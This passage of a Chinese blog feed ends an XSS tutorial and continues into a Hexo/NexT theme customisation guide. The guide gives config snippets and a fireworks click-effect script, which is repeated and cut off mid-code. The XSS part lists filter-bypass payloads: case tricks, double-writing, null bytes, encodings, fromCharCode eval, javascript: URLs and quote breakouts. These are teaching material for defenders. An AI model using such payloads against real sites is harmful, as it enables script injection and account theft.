filter；纯前端渲染，数据分离；HTML转义；设置HttpOnly属性；设置CSP；限制输入内容的长度</strong></p><h3 id="XSS绕过的技巧"><a href="#XSS绕过的技巧" class="headerlink" title="XSS绕过的技巧"></a>XSS绕过的技巧</h3><p>　　有xss防御便会有xss绕过防御姿势，这是攻与防不断博弈的表现与成果。</p><h4 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">Script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">Script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="双写绕"><a href="#双写绕" class="headerlink" title="双写绕"></a>双写绕</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">scrscriptipt</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">scrscriptipt</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="替换绕过"><a href="#替换绕过" class="headerlink" title="替换绕过"></a>替换绕过</h4><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">过滤 alert 用prompt，confirm，top[<span class="string">'alert'</span>](<span class="link">1</span>)代替绕过过滤() 用``代替绕过过滤空格 用%0a（换行符）,%0d（回车符），/**/代替绕过小写转大写情况下 字符ſ大写后为S（ſ不等于s）</span><br></pre></td></tr></table></figure><h4 id="00截断绕过"><a href="#00截断绕过" class="headerlink" title="%00截断绕过"></a>%00截断绕过</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascr%00ipt:alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h4><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">实体编码</span><br><span class="line"><span class="selector-tag">javascrip</span>&amp;<span class="selector-id">#x74</span>;<span class="selector-pseudo">:alert(1)</span> 十六进制</span><br><span class="line"><span class="selector-tag">javascrip</span>&amp;<span class="selector-id">#116</span>;<span class="selector-pseudo">:alert(1)</span> 十进制</span><br><span class="line"></span><br><span class="line"><span class="selector-tag">unicode</span>编码</span><br><span class="line"><span class="selector-tag">javascrip</span>\<span class="selector-tag">u0074</span><span class="selector-pseudo">:alert(1)</span></span><br><span class="line"></span><br><span class="line"><span class="selector-tag">url</span>编码</span><br><span class="line"><span class="selector-tag">javascrip</span>%74<span class="selector-pseudo">:alert(1)</span></span><br></pre></td></tr></table></figure><h4 id="fromCharCode方法绕过"><a href="#fromCharCode方法绕过" class="headerlink" title="fromCharCode方法绕过"></a>fromCharCode方法绕过</h4><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">String.fromCharCode(<span class="number">97</span>, <span class="number">108</span>, <span class="number">101</span>, <span class="number">114</span>, <span class="number">116</span>, <span class="number">40</span>, <span class="number">34</span>, <span class="number">88</span>, <span class="number">83</span>, <span class="number">83</span>, <span class="number">34</span>, <span class="number">41</span>, <span class="number">59</span>)</span><br><span class="line">eval(FromCharCode(<span class="number">97</span>,<span class="number">108</span>,<span class="number">101</span>,<span class="number">114</span>,<span class="number">116</span>,<span class="number">40</span>,<span class="number">39</span>,<span class="number">120</span>,<span class="number">115</span>,<span class="number">115</span>,<span class="number">39</span>,<span class="number">41</span>))</span><br></pre></td></tr></table></figure><h4 id="javascript伪协议绕过"><a href="#javascript伪协议绕过" class="headerlink" title="javascript伪协议绕过"></a>javascript伪协议绕过</h4><p>　　无法闭合双引号的情况下，就无法使用onclick等事件，只能伪协议绕过，或者调用外部js</p><h4 id="换行绕过正则匹配"><a href="#换行绕过正则匹配" class="headerlink" title="换行绕过正则匹配"></a>换行绕过正则匹配</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">onmousedown</span><br><span class="line">=alert(<span class="number">1</span>)</span><br></pre></td></tr></table></figure><h4 id="注释符"><a href="#注释符" class="headerlink" title="注释符"></a>注释符</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">// 单行注释</span><br><span class="line"><span class="comment">&lt;!-- --!&gt; 注释多行内容</span></span><br><span class="line"><span class="comment">&lt;!-- --&gt;</span> 注释多行内容</span><br><span class="line"><span class="tag">&lt;<span class="name">--</span> <span class="attr">--</span>&gt;</span> 注释多行内容</span><br><span class="line"><span class="tag">&lt;<span class="name">--</span> <span class="attr">--</span>！&gt;</span> 注释多行内容</span><br><span class="line">--&gt; 单行注释后面内容</span><br><span class="line">/* */ 多行注释</span><br><span class="line">有时还可以利用浏览器的容错性，不需要注释</span><br></pre></td></tr></table></figure><h4 id="闭合标签空格绕过"><a href="#闭合标签空格绕过" class="headerlink" title="闭合标签空格绕过"></a>闭合标签空格绕过</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;/<span class="name">style</span> &gt;</span><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="符号绕过url限制"><a href="#符号绕过url限制" class="headerlink" title="@符号绕过url限制"></a>@符号绕过url限制</h4><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span><span class="comment">//www.segmentfault.com@xss.haozi.me/j.js</span></span><br></pre></td></tr></table></figure><p>其实访问的是@后面的内容</p><h4 id="“-逃逸函数后接分号"><a href="#“-逃逸函数后接分号" class="headerlink" title="“)逃逸函数后接分号"></a>“)逃逸函数后接分号</h4><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");alert(1)//</span></span><br></pre></td></tr></table></figure><h4 id="绕过转义限制"><a href="#绕过转义限制" class="headerlink" title="\绕过转义限制"></a>\绕过转义限制</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">\")</span><br><span class="line">alert(1) //</span><br></pre></td></tr></table></figure><p>XSS练习平台</p><p>　　以下是几个XSS攻击小游戏，开发者在网站上故意留下了一些常见的 XSS 漏洞。玩家在网页上提交相应的输入，完成 XSS 攻击即可通关。</p><p><a href="https://alf.nu/alert1" target="_blank" rel="noopener">alert(1) to win</a> 　　<a href="http://prompt.ml/" target="_blank" rel="noopener">prompt(1) to win</a> 　　<a href="https://xss-game.appspot.com/" target="_blank" rel="noopener">XSS game</a>　　<a href="http://xss-quiz.int21h.jp/" target="_blank" rel="noopener">XSS Challenges</a></p><h3 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h3><ul><li><a href="https://www.freebuf.com/articles/web/185654.html" target="_blank" rel="noopener">前端安全系列（一）：如何防止XSS攻击？</a></li><li><a href="https://thief.one/2017/05/31/1/" target="_blank" rel="noopener">浅谈跨站脚本攻击与防御</a></li><li><a href="https://blog.csdn.net/hxpjava1/article/details/81005195" target="_blank" rel="noopener">面试问题如何预防xss攻击</a></li><li><a href="https://www.cnblogs.com/hejianjun/p/9082054.html" target="_blank" rel="noopener">xss攻击原理与解决方法</a></li><li><a href="https://www.cnblogs.com/mxmbk/p/5082821.html" target="_blank" rel="noopener">XSS攻击及预防</a></li><li><a href="http://www.owasp.org.cn/owasp-project/OWASPTop102017v1.3.pdf" target="_blank" rel="noopener">OWASP Top 10 - 2017</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;blockquote class=&quot;blockquote-center&quot;&gt;迟日江山丽，春风花草香&lt;/blockquote&gt;&lt;p&gt;　　xss又称跨站脚本攻击，原称为css（Cross-Site Scripting），因为和层叠样式表(Cascading Style Sheets)重名，所以又称为xss(x一般有未知的含义，还有扩展的含义)。&lt;/p&gt;
    
    </summary>
    
      <category term="web安全" scheme="https://xiaoxiaoxiaoxiaolin.github.io/categories/web%E5%AE%89%E5%85%A8/"/>
    
    
      <category term="XSS" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/XSS/"/>
    
      <category term="跨站脚本攻击" scheme="https://xiaoxiaoxiaoxiaolin.github.io/tags/%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%E6%94%BB%E5%87%BB/"/>
    
  </entry>
  
  <entry>
    <title>定制Hexo+NexT的个性化博客</title>
    <link href="https://xiaoxiaoxiaoxiaolin.github.io/posts/ccfc6699.html/"/>
    <id>https://xiaoxiaoxiaoxiaolin.github.io/posts/ccfc6699.html/</id>
    <published>2019-07-22T09:02:48.000Z</published>
    <updated>2019-08-22T11:02:04.959Z</updated>
    
    <content type="html"><![CDATA[<blockquote class="blockquote-center">日出江花红胜火，春来江水绿如蓝</blockquote><p>　　前几天，我写了一篇关于如何使用GitHub＋Hexo搭建个人博客的博文，接下来我会以我的博客为例，讲讲如何对NexT主题的个性化定制和一些细节的优化。</p><a id="more"></a><h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>　　这篇博客主要是next主题的个性化定制，还有一些细节的优化。在搭建的过程，有一些优化，也是参考了大量之前大佬的教程和结合了一些做的比较优秀的博客，我在这里做了一个集合，同时把自己做的而别人没有做的优化，写出来方便大家。</p><p>　　参考的文章我都会贴出原文链接，但是有一些优化，是我自己辛苦更改样式才做出来的效果，有些也是忘记了具体的修改方法，主要是直接审查元素，一点一点的定位到样式表，一点一点的测试修改，相信通过审查元素，你也可以做到。</p><h3 id="安装NexT主题"><a href="#安装NexT主题" class="headerlink" title="安装NexT主题"></a>安装NexT主题</h3><p>　　我使用的是比较简约的<a href="https://github.com/iissnan/hexo-theme-next" target="_blank" rel="noopener">NexT</a>主题，如果你对其他主题感兴趣，可以点击<a href="https://github.com/search?o=desc&q=topic%3Ahexo-theme&s=stars&type=Repositories" target="_blank" rel="noopener">这里</a>。</p><p>　　安装方法：打开博客根目录下的<strong>themes文件夹</strong>，右键<strong>Git Bash</strong>，运行命令：<code>git clone https://github.com/iissnan/hexo-theme-next themes/next</code></p><p>　　下载好之后，把hexo-theme-next改为next，接着打开next目录下的主题配置文件_config.yml，找到theme字段，把参数改为theme: next，之后在根目录下运行：</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">hexo clean</span></span><br><span class="line"><span class="attribute">hexo s -g</span></span><br></pre></td></tr></table></figure><h4 id="关于-config-yml"><a href="#关于-config-yml" class="headerlink" title="关于_config.yml"></a>关于_config.yml</h4><p>　　首先_config.yml，它是主题配置文件，有两个，名字一样比较容易混淆。</p><ul><li>站点配置文件，位于站点文件夹的根目录下</li></ul><p>例如我的是<code>H:/blog/_config.yml</code></p><ul><li>主题配置文件，位于主题文件夹的根目录下</li></ul><p>例如我的是<code>H:/blog/themes/next/_config.yml</code></p><p>　　Next这个主题包含4钟风格，默认的是Muse，我使用的是<strong>Pisces</strong>。你也可以尝试其他风格，具体操作：打开<code>H:/blog/_config.yml</code>，定位到Schemes，想要哪款主题就取消前面的<strong>#</strong>。</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Schemes</span></span><br><span class="line"><span class="meta">#scheme: Muse</span></span><br><span class="line"><span class="meta">#scheme: Mist</span></span><br><span class="line">scheme: Pisces</span><br><span class="line"><span class="meta">#scheme: Gemini</span></span><br></pre></td></tr></table></figure><h3 id="Next主题美化"><a href="#Next主题美化" class="headerlink" title="Next主题美化"></a>Next主题美化</h3><p>接下来就是主题的美化啦</p><p><img src="/posts/ccfc6699.html/%E8%B9%A6%E8%B7%B6.gif" alt></p><h4 id="添加Github丝带或者角标"><a href="#添加Github丝带或者角标" class="headerlink" title="添加Github丝带或者角标"></a>添加Github丝带或者角标</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/GitHub%E8%A7%92%E6%A0%87.png" alt></p><p>实现方法</p><p>　　首先先点击<a href="https://github.com/blog/273-github-ribbons" target="_blank" rel="noopener">这里</a>或者<a href="http://tholman.com/github-corners/" target="_blank" rel="noopener">这里</a>挑选自己喜欢的样式，并复制代码。</p><p><img src="/posts/ccfc6699.html/GitHub%E8%A7%92%E6%A0%87%E4%BB%A3%E7%A0%81.png" alt></p><p>　　打开<code>themes/next/layout/_layout.swig</code>文件，在<code>&lt;header&gt;&lt;/header&gt;</code>之前添加代码，并把<code>href</code>改为你的博客地址</p><p><img src="/posts/ccfc6699.html/GitHub%E8%A7%92%E6%A0%87%E4%BB%A3%E7%A0%81%E6%88%AA%E5%9B%BE.png" alt></p><h4 id="添加RSS订阅"><a href="#添加RSS订阅" class="headerlink" title="添加RSS订阅"></a>添加RSS订阅</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/RSS.png" alt></p><p>实现方法</p><p>　　首先在博客的根目录<code>H:/blog</code>，安装Hexo插件，插件会放在<code>node_modules</code>这个文件夹。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm <span class="keyword">install</span> <span class="comment">--save hexo-generator-feed</span></span><br></pre></td></tr></table></figure><p>　　接下来打开<code>H:/blog/_config.yml</code>文件，在末尾添加</p><figure class="highlight vala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># Extensions</span></span><br><span class="line"><span class="meta">## Plugins: http://hexo.io/plugins/</span></span><br><span class="line"><span class="meta"># RSS订阅</span></span><br><span class="line">plugin: hexo-generator-feed</span><br></pre></td></tr></table></figure><p>　　然后打开<code>H:/blog/themes/next/_config.yml</code>文件,找到rss，添加参数</p><figure class="highlight fsharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># hexo-generator-feed required <span class="keyword">for</span> rss support. Leave rss <span class="keyword">as</span> blank <span class="keyword">to</span> <span class="keyword">use</span> site's feed link.</span><br><span class="line"># Set rss <span class="keyword">to</span> <span class="keyword">false</span> <span class="keyword">to</span> disable feed link. Set rss <span class="keyword">to</span> specific value <span class="keyword">if</span> you have burned your feed already.</span><br><span class="line">rss: /atom.xml</span><br></pre></td></tr></table></figure><h4 id="添加动态背景"><a href="#添加动态背景" class="headerlink" title="添加动态背景"></a>添加动态背景</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E5%8A%A8%E6%80%81%E8%83%8C%E6%99%AF.png" alt></p><p>实现方法</p><p>　　打开<code>H:/blog/_config.yml</code>文件，找到<code>canvas_nest</code>,把false改为true</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">canvas_nest:</span></span><br><span class="line"><span class="attr">  enable:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">  onmobile:</span> <span class="literal">true</span> <span class="comment"># display on mobile or not</span></span><br><span class="line"><span class="attr">  color:</span> <span class="string">"0,0,255"</span> <span class="comment"># 线条颜色，三个数字分别为(R,G,B)</span></span><br><span class="line"><span class="attr">  opacity:</span> <span class="number">0.5</span> <span class="comment"># 线条透明度（0~1）</span></span><br><span class="line"><span class="attr">  zIndex:</span> <span class="bullet">-1</span> <span class="comment"># 背景的z-index属性</span></span><br><span class="line"><span class="attr">  count:</span> <span class="number">99</span> <span class="comment"># 线条的总数量</span></span><br></pre></td></tr></table></figure><h4 id="鼠标点击特效"><a href="#鼠标点击特效" class="headerlink" title="鼠标点击特效"></a>鼠标点击特效</h4><p>效果图</p><p><img src="/posts/ccfc6699.html/%E9%BC%A0%E6%A0%87%E7%82%B9%E5%87%BB%E7%83%9F%E8%8A%B1.gif" alt></p><p>实现方法</p><p>　　打开<code>H:/blog/themes/next/source/js/src</code>，新建一个firework.js文件，加入以下代码：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">"use strict"</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[<span class="number">-1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length<span class="number">-1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">"#F00"</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">"easeOutExpo"</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">"linear"</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">"easeOutExpo"</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="keyword">this</span>,i=<span class="built_in">arguments</span>;clearTimeout(a),a=setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">".fireworks"</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">"2d"</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">"mousedown"</span>,colors=[<span class="string">"#FF1461"</span>,<span class="string">"#18FF92"</span>,<span class="string">"#5A87FF"</span>,<span class="string">"#FBF38C"</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">"px"</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">"px"</span>,canvasEl.getContext(<span class="string">"2d"</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span class="built_in">document</span>.addEventListener(tap,<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="string">"sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"toggle-sidebar"</span>!==e.target.id&amp;&amp;<span class="string">"A"</span>!==e.target.nodeName&amp;&amp;<span class="string">"IMG"</span>!==e.target.nodeName&amp;&amp;(render.play(),updateCoords(e),animateParticules(pointerX,pointerY))&#125;,!<span class="number">1</span>),setCanvasSize(),<span class="built_in">window</span>.addEventListener(<span class="string">"resize"</span>,setCanvasSize,!<span class="number">1</span>)&#125;<span class="string">"use strict"</span>;<span class="function"><span class="keyword">function</span> <span class="title">updateCoords</span>(<span class="params">e</span>)</span>&#123;pointerX=(e.clientX||e.touches[<span class="number">0</span>].clientX)-canvasEl.getBoundingClientRect().left,pointerY=e.clientY||e.touches[<span class="number">0</span>].clientY-canvasEl.getBoundingClientRect().top&#125;<span class="function"><span class="keyword">function</span> <span class="title">setParticuleDirection</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">var</span> t=anime.random(<span class="number">0</span>,<span class="number">360</span>)*<span class="built_in">Math</span>.PI/<span class="number">180</span>,a=anime.random(<span class="number">50</span>,<span class="number">180</span>),n=[<span class="number">-1</span>,<span class="number">1</span>][anime.random(<span class="number">0</span>,<span class="number">1</span>)]*a;<span class="keyword">return</span>&#123;<span class="attr">x</span>:e.x+n*<span class="built_in">Math</span>.cos(t),<span class="attr">y</span>:e.y+n*<span class="built_in">Math</span>.sin(t)&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">createParticule</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=colors[anime.random(<span class="number">0</span>,colors.length<span class="number">-1</span>)],a.radius=anime.random(<span class="number">16</span>,<span class="number">32</span>),a.endPos=setParticuleDirection(a),a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.fillStyle=a.color,ctx.fill()&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">createCircle</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a=&#123;&#125;;<span class="keyword">return</span> a.x=e,a.y=t,a.color=<span class="string">"#F00"</span>,a.radius=<span class="number">0.1</span>,a.alpha=<span class="number">0.5</span>,a.lineWidth=<span class="number">6</span>,a.draw=<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.globalAlpha=a.alpha,ctx.beginPath(),ctx.arc(a.x,a.y,a.radius,<span class="number">0</span>,<span class="number">2</span>*<span class="built_in">Math</span>.PI,!<span class="number">0</span>),ctx.lineWidth=a.lineWidth,ctx.strokeStyle=a.color,ctx.stroke(),ctx.globalAlpha=<span class="number">1</span>&#125;,a&#125;<span class="function"><span class="keyword">function</span> <span class="title">renderParticule</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> t=<span class="number">0</span>;t&lt;e.animatables.length;t++)&#123;e.animatables[t].target.draw()&#125;&#125;<span class="function"><span class="keyword">function</span> <span class="title">animateParticules</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">for</span>(<span class="keyword">var</span> a=createCircle(e,t),n=[],i=<span class="number">0</span>;i&lt;numberOfParticules;i++)&#123;n.push(createParticule(e,t))&#125;anime.timeline().add(&#123;<span class="attr">targets</span>:n,<span class="attr">x</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.x&#125;,<span class="attr">y</span>:<span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;<span class="keyword">return</span> e.endPos.y&#125;,<span class="attr">radius</span>:<span class="number">0.1</span>,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">"easeOutExpo"</span>,<span class="attr">update</span>:renderParticule&#125;).add(&#123;<span class="attr">targets</span>:a,<span class="attr">radius</span>:anime.random(<span class="number">80</span>,<span class="number">160</span>),<span class="attr">lineWidth</span>:<span class="number">0</span>,<span class="attr">alpha</span>:&#123;<span class="attr">value</span>:<span class="number">0</span>,<span class="attr">easing</span>:<span class="string">"linear"</span>,<span class="attr">duration</span>:anime.random(<span class="number">600</span>,<span class="number">800</span>)&#125;,<span class="attr">duration</span>:anime.random(<span class="number">1200</span>,<span class="number">1800</span>),<span class="attr">easing</span>:<span class="string">"easeOutExpo"</span>,<span class="attr">update</span>:renderParticule,<span class="attr">offset</span>:<span class="number">0</span>&#125;)&#125;<span class="function"><span class="keyword">function</span> <span class="title">debounce</span>(<span class="params">e,t</span>)</span>&#123;<span class="keyword">var</span> a;<span class="keyword">return</span> <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="keyword">var</span> n=<span class="keyword">this</span>,i=<span class="built_in">arguments</span>;clearTimeout(a),a=setTimeout(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;e.apply(n,i)&#125;,t)&#125;&#125;<span class="keyword">var</span> canvasEl=<span class="built_in">document</span>.querySelector(<span class="string">".fireworks"</span>);<span class="keyword">if</span>(canvasEl)&#123;<span class="keyword">var</span> ctx=canvasEl.getContext(<span class="string">"2d"</span>),numberOfParticules=<span class="number">30</span>,pointerX=<span class="number">0</span>,pointerY=<span class="number">0</span>,tap=<span class="string">"mousedown"</span>,colors=[<span class="string">"#FF1461"</span>,<span class="string">"#18FF92"</span>,<span class="string">"#5A87FF"</span>,<span class="string">"#FBF38C"</span>],setCanvasSize=debounce(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;canvasEl.width=<span class="number">2</span>*<span class="built_in">window</span>.innerWidth,canvasEl.height=<span class="number">2</span>*<span class="built_in">window</span>.innerHeight,canvasEl.style.width=<span class="built_in">window</span>.innerWidth+<span class="string">"px"</span>,canvasEl.style.height=<span class="built_in">window</span>.innerHeight+<span class="string">"px"</span>,canvasEl.getContext(<span class="string">"2d"</span>).scale(<span class="number">2</span>,<span class="number">2</span>)&#125;,<span class="number">500</span>),render=anime(&#123;<span class="attr">duration</span>:<span class="number">1</span>/<span class="number">0</span>,<span class="attr">update</span>:<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;ctx.clearRect(<span class="number">0</span>,<span class="number">0</span>,canvasEl.width,canvasEl.height)&#125;&#125;);<span 